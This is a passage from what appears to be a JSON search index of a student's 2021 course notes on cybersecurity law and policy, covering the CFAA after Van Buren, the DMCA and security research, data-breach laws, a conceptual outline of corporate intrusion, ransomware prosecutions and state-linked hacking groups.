\u0026ldquo;Gates-up-or-down question\u0026rdquo; # Majority: Liability \u0026ldquo;stems from a gates-up-or-down inquiry - one either can or cannot a computer system, and one either can or cannot access certain areas within the system [8].\u0026rdquo; Footnote [8]: \u0026ldquo;For present purposes, we need not address whether this inquiry turns only on technological (or \u0026lsquo;code-based\u0026rsquo;) limiations or access, or instead also looks to limits contained in contracts or policies\u0026rdquo; Leads to open questions: How will courts apply this to \u0026ldquo;unauthorized access\u0026rdquo; cases? What counts as a \u0026ldquo;gate\u0026rdquo; and what counts as \u0026ldquo;up or down\u0026rdquo;? Will you necessarily know when a gate is there and you\u0026rsquo;re bypassing it? (see 9th. Cir. re: IP blocks) What will courts do with Footnote 8? What does this decision mean for bug bounty programs? What if bug bounty terms say \u0026ldquo;you may test database X but not database Y?\u0026rdquo; What does this decision mean for web scraping? We may soon find out, since 9th Cir. needs to reevaluate hiQ v. LinkedIn Oral arguments Oct. 18, 2021 - but hiQ labs went out of business in 2018 "},{"id":164,"href":"/notes/intlpol268/2021-10-11-network-security/","title":"Network Security","section":"INTLPOL 268, Fall 2021","content":" Network Security # How does the internet work? # Packet Switching Break up internet communications messages into packages, release them onto the network, each node in the network forwards it to the next node until reaching the host which reassembles it into the correct order Two universally used protocols: IP - Internet Protocol BGP - Border Gateway Protocol Internal networks can be different (Comcast uses DOCSYS, AT\u0026amp;T uses LTE and 5G) but the networks themselves talk IP/BGP to each other Web layers # Notes:\nOnly 4 layers: OSI Model is irrelevant to how networks work in 2021! Layers \u0026ldquo;go inside\u0026rdquo; each other, not top-to-bottom Physical/Link layer # Moves actual data between two systems Only provides for ability to comunicate one hop Link and physical are generally tied together to make things \u0026ldquo;just work\u0026rdquo; Example: Ethernet Internet layer # Provides for addresses that work across the world Can be carried on many different physical layers Is best-effort, no guarantee it will arrive All IP packets arrive in the same \u0026ldquo;inbox\u0026rdquo; at destination IPv4: Can have 2^32 ~= 4bn addresses\nBut we can share IP addresses! Special reserved part of address space (e.g. 192.168.*.*, 10.100.*.*) Router/firewall translates into one public address IPv6: Can have 2^128 addresses\nTransport layer # Provides reliability Allows for multiple services Allows for multiplexing Example: port numbers for different application Application # Basic language: HTTP Plus stuff on top of it: HTML/CSS/JS/etc Glue Protocols # Pull layers together!\nBetween MAC address (link layer) and IP address (internet layer):\nDHCP: Dynamic Host Configuration Protocol Automatically configures where each host should be on an internal network Configures gateway for hosts to get to outside internets ARP: Address Resolution Protocol Between IP address (internet layer) and application layer (domain name):\nDNS: Domain Name System Resolves domain names to IP addresses Sometimes: ISP DNS; however, has had issues where ISPs MitM to display ads Often: Google DNS (8.8.8.8) or Cloudflare (1.1.1.1) "},{"id":165,"href":"/notes/intlpol268/2021-10-13-cfaa-dmca-and-security-research/","title":"Cfaa Dmca and Security Research","section":"INTLPOL 268, Fall 2021","content":" Computer Fraud and Abuse Act (CFAA), continued # hiQ v. LinkedIn (oral arguments Oct. 18, 2021 - remanded to 9th circuit)\nhiQ argument: Van Buren\u0026rsquo;s gates up/down inquiry means scraping publicly avail data is OK (gate up) but scraping private data (like in Power Ventures) is not (gate down) C\u0026amp;D letters and counter-bot measures don\u0026rsquo;t count as \u0026ldquo;down gates\u0026rdquo; since info is public LinkedIn argues: Public data counts as \u0026ldquo;authorization\u0026rdquo;, but LinkedIn put the \u0026ldquo;gate down\u0026rdquo; with C\u0026amp;D letter, targeted IP blocks, so after that hiQ access was without aughorization IP blocks are technological or code-based rstrictions on access, per Van Buren footnote 8 Southwest Airlines v. Kiwi.com (N.D. Tex. Sept. 30, 2021)\nKiwi scraped flight data from Southwest Airlines website, resold flights + additional fees Southwest sent C\u0026amp;D letters to Kiwi and implemented tech. countermeasures Claims in lawsuit: CFAA, TX \u0026ldquo;mini-CFAA,\u0026rdquo; breach of contract, TM infringement, etc Southwest gets injunction to make Kiwi stop scraping, based on breach of contract claim Court rejects Kiwi\u0026rsquo;s argument that it hadn\u0026rsquo;t agreed to Southwest\u0026rsquo;s terms Court says hiQ doesn\u0026rsquo;t matter here, because that\u0026rsquo;s a CFAA case (and hiQ even says there can be a breach of contract claim even if no CFAA claim) and it was vacated by SCOTUS post-Van Buren Kiwi will likely appeal to 5th Circuit Takeaway: law of scraping is still murky, so there\u0026rsquo;s still legal risk after hiQ and Van Buren\nWhat laws can be used other than CFAA? # Other laws have been invoked alongside CFAA in civil and criminal cases\nFederal law Copyright infringement (Cvent, AP v. Meltwater (S.D. N.Y. 2013), Compulife v. Newman (11th Cir. 2020)) Meltwater and Newman are web-scraping suits but not filed under CFAA Lanham Act (trademark infringement, unfair competition) (Cvent, Kiwi) Trade secret misappropriation (Nosal) ECPA (Google Safari Cookie) Honest services fraud (Van Buren) (criminal only) Wire fraud (U.S. v. Nicolescu (6th Cir. Oct. 5, 2021) (criminal only) State and common law Mini-CFAA (Cvent (VA), Power Ventures (CA), Newman (FL), WhatsApp v. NSO Group (CA), Kiwi (TX)) Trade secret misappropriation (Compulife) Unfair competition Breach of contract (Cvent, Kiwi, NSO) Fraudulent inducement Tortuous interference with contract (where defendant causes other users to break TOS) Breach of privacy (ACLU lawsuit against Clearview AI under IL Biometric Information Privacy Act) Unjust enrichment (Cvent, Kiwi) Trespass to chattels (ebay v. Bidder\u0026rsquo;s Edge (N.D. Cal. 2000), Intel v. Hamidi (Cal. 2003)) Claims may not necessarily succeed, and may be widely considered wrongly decided if they do (e.g., Newman, Bidder\u0026rsquo;s Edge), but being sued is still an issue!\nCFAA impact on security research # MBTA v. Anderson (D. Mass. 2008): MIT students gagged from presenting research on vulnerabilities in transit card system until conference over Sandvig lawsuit: social sciences researchers sued DOJ under first amendment, claiming thei feared CFAA prosecution Research was on algorithm-based discrimination wrt housing and jobs TOS prohibitions: Bots, scraping, crawling, sock puppets Court ruled in 2018 that 1030(a)(2)(C) doesn\u0026rsquo;t covered these accesses, because \u0026ldquo;exceeds authorized access\u0026rdquo; is about access restrictions, not use restrictions Ruled in 2020 that TOS violation is not a CFAA violation, and that creating accounts using false info isn\u0026rsquo;t \u0026ldquo;bypassing an authentication gate\u0026rdquo; because the credentials are authentic and non-stolen Case dismissed as moot because proposed research didn\u0026rsquo;t violate CFAA; researchers appealed, but dropped appeal after Van Buren How will Van Buren affect security researchers? # Commentators are mostly optimisitic\nTim Edgar (Brown University): Van Buren is good for two reasons Narrows scope of CFAA; will promote companies working with rather than against security researchers Companies will be forced to step their game up wrt security EFF: Van Buren means it\u0026rsquo;s not a crime to violate TOS limiting purposes for accessing info or restricting later use of data But notes that FN8 left unresolved whether \u0026ldquo;gates down\u0026rdquo; means only technological limits or also contractual/policy limits Riana Pfefferkorn: Congress should reform CFAA Voatz, hacked mobile voting company, reacted to Van Buren by downplaying its importance and signaling a continued willingness to go after researchers Unclear that CFAA actually deters \u0026ldquo;black hats\u0026rdquo; and has a chilling effect on \u0026ldquo;white hats\u0026rdquo; Instead of litigation to resolve questions that SCOTUS left open, Congress should act to narrow the statute and protect good-faith research Digital Millenium Copyright Act (DMCA) # DMCA sections # 1201: Anti-circumvention provisions Acts of circumvention (a)(1) \u0026ldquo;No person shall circumvent a technological measure that effectively controls access to a work protected [by federal copyright law]\u0026rdquo; Trafficking in circumvention tools (a)(2), (b)(1) \u0026ldquo;No person shall manufacture, import, offer to the public, provide, or otherwise traffic in any technology, product, service, device, component, or part thereof\u0026rdquo; for circumvention of technological measure What are technological protection measures? e.g. DRM: region codes for DVDs, encryption for HD DVD and Blu-Ray, copy-protection on movies and games Chip/software authentication handshakes Secret handshake authentication sequence between game software and the gaming server (e.g. WoW game + Blizzard servers) What are circumvention tools? Technology/product/service/etc that\nis primarly designed or produced for the purpose of circumventing [an access-control or copy-control TPM]; has only limited commercially significant purpose or use other than to circumvent; or is marketed by that person or another person acting in concert with that person with that person\u0026rsquo;s knowledge for use in circumventing protection. Example: DeCSS\nThis section is less enforced today: Exemptions may be effective Market changes since early 2000s, DRM largely ineffective and shifts away from CDs/DVDs to streaming Chilling effects = less research activity Corporate pushback against the chill - Microsoft/Github Exemptions: 1201(f) Reverse engineering for interoperability Circumvention of TPM is OK for making programs interoperable with each other, but need to jump through a lot of hoops 1201(j)(1) Security testing exception Need authorization from computer system/network owner to do good faith testing/investigation/correction of security flaws or vulnerability - otherwise subject to DMCA liability Still cannot violate copyright, CFAA, other laws 1201(a)(1)(C-D) DMCA Triennial Rulemaking Librarian of Congress has power, upon recommendation of the Register of Copyrights, to grant 3-year exemptions Lots of hoops to jump through, and only limited immunity Exemptions expire after 3 years Security research exemption was significantly expanded in 2015, 2018, and 2021 Others for libraries, law enforcement, etc. 1203: Civil remedies Injunctions Impounding Damages: Actual damages + profits, or Statutory damages: 1201: $200-$2,500 per violation 1202: $2,500-$25,000 per violations Damages go up for repeated violations or down for innocent violation Costs and attorney fees 1204 - Criminal penalties If willful, for purpose of commercial advantage/private financial gain, then up to $500,000 fine and/or 5 years in prison CFAA uses # Secure Digital Music Initiative threat against researchers (2000) Princeton prof. Ed Felten et al. defeated watermarking technologies to protect digital music files SDMI threatened them with DMCA liability Researchers withdrew findings from academic conference Ultimately presented at other conference U.S. v. Skylarov/Elcomsoft (N.D. Cal. 2001) Dimitry Skylarov, Russian citizen, created Software for Adobe e-book owners to convert from e-book format to PDF for his employer Elcomsoft Presentation at DEFCON 2001 in Las Vegas This fell afoul of DMCA marketing provision, even though the actions were legal in Russia Prosecuted in Northern California since Adobe HQ is in San Jose US went after Elcomsoft and dropped charges against Skylarov in exchange for his testimony against his employer Green et al. v. U.S. Department of Justice (D.D.C 2016) Intel threatened to sue Andrew Huang, computer scientist/inventor, over a digital video device he wanted to make Matthew Green, computer science professor at Johns Hopkins University, wanted to publish security book Green: 2015 security research exemption did not cover desired research and books June 2019 court decision: partially denied govt\u0026rsquo;s motion to dismiss the case Dismisses some of plaintiffs\u0026rsquo; claims, but rules plaintiffs adequately alleged that 1201 is unconstitutional as applied to desired contucts \u0026ldquo;Code is speech\u0026rdquo;: DMCA and triennial rulemaking process burden use and dissemination of computer code, thereby implicating First Amendment DMCA prohibition on circumvention and trafficking burden 1st Am-protected agtivities Govt doesn\u0026rsquo;t show that 1201\u0026rsquo;s anti-circumvention and anti-trafficking provisions don\u0026rsquo;t burden more speech than necessary to further govt\u0026rsquo;s interest in prohibiting piracy July 2021 decision: denied plaintiffs\u0026rsquo; request for injunction against prosecuting them Green\u0026rsquo;s book describing how to circumvent TPMs likely would not trafficking in a TPM circumvention tool, so no crime, no injunction needed Huang denied an injunction because unlikely to succeed on merits of 1st Am claim, govt interest in protection copyrighted works from privacy outweighs speech interest in trafficking device that would facilitate privacy of streaming video, games, DVD/Blu-Ray, etc Plaintiffs filed an appeal to the D.C. Circuit in September 2021 Apple v. Corellium (S.D. Fla. 2019) DMCA means that one can violate copyright laws without copyright infringement DMCA 1203 allows civil lawsuits Corellium makes an iOS virtualization tool used for security testing research Alleged anti-trafficking violations under 1201(a)(2) and 1201(b) for \u0026ldquo;trafficking in products that are used to modify iOS and circumvent technological controls that protect copyrighted works\u0026rdquo; In 2020, courts dismissed Apple\u0026rsquo;s claims for copyright infringement on the basis of fair use (but let DMCA claims move forward) - Apple now appealing that ruling to 11th Cir. In August 2021, parties settled DMCA suit, Corellium can keep selling its product "},{"id":166,"href":"/notes/intlpol268/2021-10-20-data-security-laws/","title":"Data Security Laws","section":"INTLPOL 268, Fall 2021","content":" Data Security and Data Breach Notification Laws # Nothing comprehensive at the federal level; states have all the power here.\nState Data Breach Notification Laws # Each state, plus DC/PR/VI/GU have one Laws share many commonalities, but plenty of variation Discovering/being notified of a \u0026ldquo;breach of the security of the system\u0026rdquo; triggers duty to notify Any state resident whose \u0026ldquo;personal information\u0026rdquo; (PI) was, or is reasonably believed to have been, acquired by an unauthorized person Definitions comonly used by many states: Breach of security of system: unlawful, unauthorized acquisition of PI PI: first name/initial + last name + 1 more of SSN, DL/ID card number, account/credit/debit number + pin/code/password Laws generally apply to computerized data that includes PI Excludes publicly available information lawfully made available to the public by government or media Many states add more types of info to definitions of PI Ex: in California\nNeed to notify attorney general (AG)\u0026rsquo;s office if organization has data breach AG\u0026rsquo;s office curates list of data breaches on website; searchable by name and date; includes both private entities and CA public entities Some states require notification ASAP\nCriticism is that this forces notification before it is clear what exactly happened; vague initial notices can sow fear/uncertainty/doubt among public State Data Security Laws # About half of states have these; some apply to business only, government only, or both Number of states with these has doubled since 2016 Some commonalities with a lot of state-by-state variance In general, businesses that own, license, or maintain \u0026ldquo;personal information\u0026rdquo; about a state resident must Implement and maintain \u0026ldquo;reasonable security procedures and practices\u0026rdquo; appropriate to the nature of the information Protect the personal information from unauthorized access, destruction, use, modification, or disclosure Some states have \u0026ldquo;sectoral laws\u0026rdquo;; e.g. payment card info, health data, etc Some states impose specific security requirements (e.g. CO, MA, NY) MA sued Equifax over breach since Equifax violated many provisions of its data security law; recently settled for millions of dollars The evolution of California data security laws # 2016: CA data security law: reasonable security procedures if maintaining personal data 2019: Equifax addition: consumer credit reporting ages need to do software updates ASAP 2020: California Consumer Privacy Act (CCPA) (see: ECPA lecture): allows individuals to sue companies for punitive ($100-$750) or actual damages if \u0026ldquo;nonencrypted and nonredacted\u0026rdquo; PI is exfiltrated 2023: California Privacy Rights Act (CPRA): expands definition of personal information NY Department of Financial Services regulations # 2017: NYDFS enacted Cybersecurity Regulation; specifies minimum cybersecurity requirements for all covered financial institutions Periodic risk assessments Audit trail for cybersecurity events Data retention limits and access controls for PII Incident response plan Encryption of sensitive data Deploy multifactor authentication Annual compliance certification Criticism: rules may be rigid and unworkable First enfocement action: July 2020, against First American Title Insurance Co. Vuln dating back to May 2014 detected in December 2018, and company waited 6mo+ to notify customers Anyone with a web browser could access millions of customers\u0026rsquo; PI dating back 16 years First penalty: March 2021, $1.5 million, against Residential Mortgage Services Inc. Routine compliance exam revealed RMS hadn\u0026rsquo;t disclosed 2019 data breach or done required risk assessments Now, FTC wants to be more like NYDFS Gramm-Leach-Bliley Act \u0026ldquo;Safeguards Rule\u0026rdquo;: FTC is one of several agencies that GLBA gives regulatory and efnorcement authority re: how financial institutions protect consumer info FTC wants to amend Safeguards Rule to imitate NYDFS regs Federal Agency Enforcement # SEC Breach Notification Requirements (and Data Security) # Public companies must report \u0026ldquo;material\u0026rdquo; events to shareholders \u0026ldquo;Material\u0026rdquo;: substantial likelihood that info might be important to make an investment decision 2018 guidance on cybersecurity disclosures: SEC requires companies to disclose factors that make investments in company\u0026rsquo;s securities speculative or risky This includes cybersecurity risks or incidents Disclosure of risk factors should be tailored, not generic Disclosures must be \u0026ldquo;timely\u0026rdquo;; ongoing investigation may affect scope of disclosure but does not alone justify nondisclosure March 2021 report by IT security firms: public companies aren\u0026rsquo;t following on SEC guidance Too much vague legalese boilerplate, leaving investors in dark re: actual risks and actual attacks Recommends private companies should provide more detail and candor to SEC SEC\u0026rsquo;s current SolarWinds probe: document requests to hundreds of companies Companies affected by SolarWinds Russian hacking operation being asked for records re: \u0026ldquo;any other\u0026rdquo; data breach or ransomware attacks since October 2019 Fear of liability if probe reveals breaches that should have been disclosed, or poor internal security controls Data security: 3 recent enforcement actions under Reg S-P \u0026ldquo;Safeguards Rule\u0026rdquo; SEC Yahoo Settlement (April 2018) # Yahoo misled investors by failing to disclose one of the largest data breaches ever Dec. 2014: Information security team learned that Russian hackers had stolen PII for hundreds of millions of user accounts SEC alleged Yahoo failed to properly investigate breach circumstances and didn\u0026rsquo;t adequately consider whether it needed to disclose to investors Over 2 years before breach was publicly disclosed - in 2016, when Yahoo was being acquired by Verizon Note: MA AG sued Equifax for taking 40 days to disclose! SEC also alleged that during that 2-year period, quarterly and anual SEC reports didn\u0026rsquo;t disclose breach; only said Yahoo faced the risk of breaches SEC and Yahoo settled for $35 million penalty FTC: Fair Information Practice Principles (1998) # Notice/Awareness Choice/Consent Acess/Pariticipation Integrity/Security: requires organizations to protect the quality and integrity of PI Enforcement/Redress FTC section 5 authority: \u0026ldquo;Unfair or deceptive acts or practices in or affecting commerce\u0026hellip;are\u0026hellip;declared unlawful\u0026rdquo;\nAbility to levy fines Ability to define adequate practices FTC v. Wyndham Hotels (3rd Cir. 2015)\nFTC has Section 5 authority to regulate data security practices Wyndham had fair notice of potential \u0026ldquo;unfair\u0026rdquo; prong liability under FTC Act, due to FTC\u0026rsquo;s previous adjudication and interpretive guidance Settled: 20-year consent decree, security focused practices, audits FTC v. LabMD (11th Cir. 2018)\nLabMD argued that without formal agency rulemaking, LabMD was not on notice of what\u0026rsquo;s unreasonable Assumed without deciding that poor data security is an unfair practice Court sided with LabMD Pos LabMD, consent orders won\u0026rsquo;t be as useful to police future bad behavior; now FTC data security orders have gotten more specific FTC sues everyone!\nDozens of 5 enforcement actions re: inadequate consumer PI protection since 2002 FTC consent orders require creation of comprehensive info security programs -\u0026gt; FTC developed a set of de facto security standards and practices Failure to comply = fines for violated the order Requirements for act or practice to be unfair: \u0026ldquo;causes or is likely to cause substantial injury to consumers\u0026rdquo; \u0026ldquo;which is not reasonably avoidable by consumers themselves\u0026rdquo; \u0026ldquo;and is not outweighted by countervailing benefits to consumers or to competition\u0026rdquo; Examples:\nCVS Caremark (2009) Facebook (2011) Facebook (2019) Cambridge Analytica - violation of 2011 decree - $5 billion fine Google (2011) Twitter (2011) Uber (2017) Lenovo (2017) PayPal/Venmo (2018) D-Link (2019) Equifax (2019) Class Action Litigation # Lawsuits by people whose data was breached\nExample: Yahoo Class action lawsuit over 3 separate breaches affecting a total of 3 billion accounts Settlement of $117.5 million in April 2019 Around 194 million people in the US and Israel may be eligible to make claims Securities class action (by shareholders): still very effective\nYahoo: $80m, another $29m settlement Equifax: $149 million "},{"id":167,"href":"/notes/intlpol268/2021-10-25-corporate-intrusion/","title":"Corporate Intrusion","section":"INTLPOL 268, Fall 2021","content":" Corporate Intrusion # Privilege escalation # An attacker starts with no privilege and no ability to access anything Initial entry point: sending a fake PDF to a lawyer, sending a fake Excel spreadsheet to an accountant, etc Attackers want to end with privileges necessary for their objectives Escalation may happen remotely or locally Computer privilege levels # Limited accounts (jails) - programs run with limited privileges to trap any attackers who successfully compromise them Normal user account - ability to run programs and access data in home and shared directories; but cannot install software and access data from other users Administrator/root - highest privileged user account, can access anything on the device but cannot necessarily modify OS itself Service accounts - used by software that runs in the background, has lots of power but cannot modify running system System/kernel - fully privileged to interact directly with hardware, access all data, modify running system Managed systems # Computers on a corporate network are managed by a central authority (i.e., IT department) to provide a consistent environment Corporate endpoints (i.e., user laptops, servers, other equipment) connect to corporate domain server that manages endpoints To exploit:\nSend payload (i.e., compromised Excel file or phishing email) to endpoint Example: attack via legal department, malware jumps from endpoint to domain server which can then attack more endpoints However, modern firewalls can do detection of data exfiltration Hashes # What is a hash? # A hash is a function that creates a \u0026ldquo;fingerprint\u0026rdquo; of an arbitrary input that is\nThe same every time Fixed length Difficult to return to the original Small change in the input leads to large change in the hash How to break hashes? # Brute-force (alphabetical) attack Computationally expensive, many strings unlikely to be passwords Dictionary attack: maintain dictionary of common passwords, check them all Can do password cracking with GPUs for speedup Eternal Blue # Exploit engineered by NSA in Microsoft Windows SMB server (file sharing protocol for local servers) Functionality was enabled for all Windows computers as late as 2017 Leaked by hacking group Shadow Brokers in April 2017 "},{"id":168,"href":"/notes/intlpol268/2021-10-27-ransomware-and-foreign-hackers/","title":"Ransomware and Foreign Hackers","section":"INTLPOL 268, Fall 2021","content":" Ransomware and Foreign Hackers # TW: discussion of death of a baby\nThe recent ransomware boom # Why is ransomware so big now? Cryptocurrency.\nRansoms have been around for a long time, so has malware Historically, ransomware was used to hit small businesses and charge hundreds of dollars to recover data However, hackers now routinely extort critical infrastructure providers (gas pipelines, transportation systems, etc) for hundreds of millions of dollars Cryptocurrency is easier to obtain, transact, convert to real currency Exchanges are less uptight than backs about KYC (Know Your Customer)/AML (Anti Money Laundering) laws People generally think cryptocurrency is untraceable However: this myth was busted in June 2021 after FBI recovered 63.7 of 75 bitcoins paid to DarkSide after Colonial Pipeline hack DarkSide: \u0026ldquo;ransomware as a service\u0026rdquo; provider that sell ransomware payloads to other criminal/hacking groups Ironically, crypto can be traced by FBI faster than bank transactions Criminal prosecutions of ransomware attackers # Prosecution using CFAA # CFAA has been repeatedly used by DOJ in ransomware-related incidents SamSam ransomware developers (both Iranian): indicted Nov. 2018 Victims: hospitals, municipalities, public institutions 6 counts, including 1030(a)(5)(A), 1030(a)(7)(C) Status: nothing has happened since Nov. 2018, presumably still in Iran CFAA has little teeth against hackers in non-extradition nations Kelihos botnet operator (Russian): indicted 2017, extradited from Spain in early 2018 Allegedly used botnet to distribute JakeFromMars ransomware 8 counts, including 1030(a)(4), 1030(a)(5)(A), 1030(a)(7)(C) Status: sentenced August 2021 to time served + 3 years supervised release Plead guilty to 4 counts: 1030(a)(5)(A), conspiracy, wire fraud, aggravated ID theft Two co-conspirators were convicted and plead guilty to CFAA offenses in summer 2021 Trickbot ransomware developer (Latvian): indicted 2020, arrested in Miami February 2021, arraigned in Ohio June 2021 Ransomware-as-a-service provider Lived in Suriname, arrested when flying through MIA airport from Suriname 47 counts, including conspiracy to violate (among others) 1030(a)(2)(C), 1030(a)(4), 1030(a)(5)(A), 1030(a)(7)(C) Status: unknown, because case is under seal Other Trickbot gang members still at large in Russia, Belarus, Ukraine, Suriname Other laws used to prosecute # Wire fraud, 18 U.S.C. section 1343 Very common in hacking cases, along with bank fraud where relevant (Trickbot, APT 38) Having a scheme to defraud someone or obtain money by false pretenses + sending a communication via the Internet for purpose of carrying out the scheme Communication can be to an intended victim of the fraud scheme Kelihos defendant used botnet to send \u0026ldquo;pump and dump\u0026rdquo; spam Or: Doing online research to find potential victims (SamSam, APT 38) Using victims\u0026rsquo; stolen bank logins to authorize money transfers (Trickbot) Online communications among co-conspirators (APT 38) or with customers (Kelihos) Aiding and abetting, 18 U.S.C. section 2 Conspiracy and attempt Conspiracy to commit some other federal offense, 18 U.S.C. section 371 Conspiracy or attempt to violate the CFAA, 18 U.S.C. section 1030(b) Conspiracy or attempt to commit wire fraud, 18 U.S.C. section 1349 Civil litigation against victims of ransomware attacks # Kidd v. Springhill Hospitals (filed June 2020) # Alabama wrongful-death lawsuit against hospital (plus doctors, care team, etc.) by mother of infant who was delivered in distress during a ransomware attack and later died Distinct from data security and data breach notification laws Not about PII being poorly secured, breached, or hacked Allegedly improper care resulting in death because cyberattack took down crucial equipment Also distinct from CFAA because CFAA penalizes the hacker, not the hacked What causes of action are asserted? Fraudulent non-disclosure - for not telling mother that ransomware had taken down hospital systems and placed patient care and saftety at risk, or sending her somewhere else to deliver her daughter \u0026ldquo;Wantonness\u0026rdquo; - hospital had duty to provide appropriate medical care and wantonly failed to do so, in part because cyberattack had forced them to use outdated paper charts etc Wrongful death - resulting from wanton failure to provide appropriate medical care Negligence - negligently departed from the accepted standard of care, in part because electronic medical equipment and record-keeping systems unavailable due to cyberattack Breach of implied contract - to safely provide medical care and nursing If ransomware attacker is ever caught, potential CFAA case? Offense: 1030(a)(5)(A), 1030(a)(7)(C) - as seen in SamSam indictment involving several hospitals Punishment: 1030(c)(4)(F): \u0026ldquo;if the offender\u0026hellip;recklessly causes death from conduct in violation of subsection (a)(5)(A)\u0026rdquo; - fine + up to life in prison 1030(c)(3): for (a)(7)(c) - fine/prison (5 years first offense, 10 years otherwise) Could Kidd, the mother, assert a civil CFAA claim against the attacker? Probably yes, but no court cases say so explicitly Cf. Wofse v. Horn, No. 19-cv-12396 (D. Mass. March 2, 2021) - plaintiff alleged that defendants\u0026rsquo; cyberattacks adversely affected his health, court allowed civil case, but different CFAA subsection Expect more cases as more ransomware on hospitals cause more harm and deaths Hospitals are not always treated as off-limits, some attackers bet hospitals have incentive to pay up September 2021 CISA report says ransomware attacks on hospitals, coupled with COVID-19 caseloads, have pushed National Critical Function of providing medical care almost to the breaking point Potential liability of ransomware victims that pay ransom # Ransomware: to pay or not to pay? # Supply and demand: if crime doesn\u0026rsquo;t pay (supply): maybe less crime (demand), incentive to punish ransomware payors Countervailing concern: if paying is punished, companies would still pay but not tell govt about the hack Peters/Portman bill would provide money for recovery costs (ransomware remediation cost ~= $2M) Material support statutes: prohibit knowingly provide money to a Foreign Terrorist Organization Treasury Department\u0026rsquo;s Office of Foreign Assets Control (OFAC) OFAC sanctions list: individuals and companies owned, controlled by, or acting for/on behalf of, targeted foreign countries and regimes (Cuba, North Korea\u0026rsquo;s Lazarus Group aka APT 38, terrorist orgs like Al Qaeda, drug traffickers like El Chapo) Paying ransom to unknown hackers that end up on the list: OFAC will go after payors Per Oct. 2020 advisory, OFAC will also go after those who facilitate payments to hackers on the sanctions list: i.e., cyber insurers, financial institutions, digital forensics and incident recovery firms, payment processors, consultants who help victims broker a deal with ransomware gang, etc Nov. 2018: blacklisted two Iranians for exchanging SamSam ransoms from BTC to rial, depositing in Iran banks Just blacklisted cryptocurrency exchange Suex for facilitating BTC transactions for ransomware actors It makes no difference if facilitators/victims don\u0026rsquo;t know the anonymous hacker is on the sanctions list Hacker\u0026rsquo;s IP address may be spoofed; also, China lets NK state-affiliated hackers work from China In Sept. 2021, OFAC re-emphasized that paying ransoms threatens national security, may violate OFAC regulations SolarWinds: attributed to Russian SVR, aka APT 29, aka Nobelium Motive: affected Treasury, State, DOJ, other federal agencies Microsoft says goal was to obtain information about sanctions and US policy on Russia, plus counter-intelligence matters, methods for catching Russian hackers Alternative to payment: find a way to unlock the data yourself # FBI discourages against paying ransoms but also doesn\u0026rsquo;t support a ban on paying What if you already paid? FBI can help, they got the private key to DarkSide\u0026rsquo;s BTC wallet Maybe can find a flaw in hackers\u0026rsquo; code April 2021: QLocker ransomware flaw, glitch in payment system made it easy to look like a victim already paid, so the system unlocked the victim\u0026rsquo;s file In October 2021: NZ cybersecurity firm Emsisoft helped victims recover data May 2021 Colonial Pipeline attack by DarkSide: group regrouped as new name BlackMatter Emsisoft found error in BlackMatter\u0026rsquo;s code that let it decrypt files and restore access to data Secretly helped dozens of victims unlock data Eventually BlackMatter caught on and patched the vulnerability, but Emsisoft saved millions of dollars in the meantime Controversy: FBI sat on Kaseya ransomware decryption key for 3 weeks instead of sharing it with victims of the REvil ransomware gang, costing them millions Goal: not compromise FBI investigation, if nobody was paying up, REvil might get suspicious Group shut down anyway first, went quiet for a while (then came back, got taken offline by US and others) Unclear what victims should do, FBI says not to pay ransom but is not helpful when victims need it Foreign state-affiliated ransomware # Russia # Kremlin doesn\u0026rsquo;t have broad control over private hacking groups, but leaves them alone as long as they don\u0026rsquo;t hack the Kremlin and goals are broadly aligned with the Kremlin Kremlin can send signals for the hacking groups to go underground; this happens if they believe US will retaliate with a cyberattack North Korea: Lazarus Group (APT 38) - December 2020 indictment # Three individuals, members of units of RGB military intelligence agency Expansion of 2018 indictment of one of the three individuals Motive? \u0026ldquo;Further strategic and financial interests\u0026rdquo; of NK and Kim Jong Un Wide-ranging scope of acts: monetary gain, retribution, info-gathering, etc Sony Pictures hack (2014) Creating WannaCry 2.0 ransomware (2017) Hacking banks + fraudulent wire transfers in 6 countries; \u0026gt;$1.3B (2015-2019) Malicious cryptocurrency trading applications (2018-2020) Stealing crypto from wallets of cryptocurrency companies (2017-2020) ATM \u0026ldquo;cash-out\u0026rdquo;: ATM dispenses cash to co-conspirator (2018) Spear-phishing employees of state, DoD, defense contractors, energy utilities, etc Charges: Conspiracy to violate the CFAA: sections 1030(a)(2)(C), 1030(a)(4), 1030(a)(5)(A), 1030(a)(7)(A)-(C) - similar to earlier ransomware indictments Conspiracy to commit wire fraud and bank fraud Interesting facts from indictment: Hackers sometimes worked from China and Russia Some of the theft for state, some for themselves Names a Canadian co-conspirator sentenced to \u0026gt;11 years in prison for money laundering conspiracy, including 2 APT 38 heists China: Hainan MSS (APT 40) - May 2021 indictment # 3 officers of Ministry of State Security; 1 hacker for hire Created a \u0026ldquo;security research\u0026rdquo; front company Staffed and managed by local universities Another wide-ranging hacking scheme: steal IP and confidential data for competitive advantage of Chinese government, companies, and commercial sectors Ebola virus/vaccine research Submarine R\u0026amp;D AVs Chemical research Genetic sequencing tech Information on pending deals and disputes with governments of other countries (Malaysia, Cambodia) Hacked victims in 12 countries worldwide using spear-phishing Research facility Universities in multiple states IT companies Defense contractors Swiss chemicals company Airlines Cambodian government ministry Malaysian high-speed rail company Malaysian political party NIH etc Stored malware and stolen data on GitHub, concealed using steganography, stored other stolen data on Dropbox Charges: Conspiracy to violate CFAA, sections 1030(a)(2)(B)-(C), 1030(a)(5)(A) Conspiracy to commit economic espionage under 18 U.S.C. section 1831 Same other law used in United States v. Nosal Note details: photos of the buildings where they worked, search queries they ran online (e.g., \u0026ldquo;Dropbox appkey\u0026rdquo;), passwords to malware and files Anonymous research group \u0026ldquo;IntrusionTruth\u0026rdquo; reported in January 2020 on links between APT 40, Hainan MSS, and front company Overt acts alleged in furtherance of conspiracy occurred 2009-2018 Even after 2015 Obama-Xi agreement not to hack IP for commercial advantage APT 40 and ransomware Allegedly, APT 40 engages in ransomware hacks now, not just for espionage APT 40 blamed for MS Exchange email server hacking campaign in early 2021 Over 250,000 email servers compromised Microsoft attribution in March 2021 White House attribution not until July, citing support from EU, UK, NATO White House asserts APT 40 behind ransomware attacks Alleges Chinese government turns a blind eye when MSS\u0026rsquo;s current or former contract hackers conduct private ransomware attacks (not on state behalf) White House stopped short of issuing sanctions on China Why isn\u0026rsquo;t Exchange/ransomware attacks in indictment? Guess: Indicted individuals in APT 40 weren\u0026rsquo;t behind those attacks Possibly more indictments coming "},{"id":169,"href":"/notes/intlpol268/2021-11-01-cryptography/","title":"Cryptography","section":"INTLPOL 268, Fall 2021","content":" Cryptography # Definitions # Cryptography: the study of secret or secure communications Cryptology: the study of math behind cryptography Cryptanalysis: code-breaking Plaintext: an unencrypted input/output of 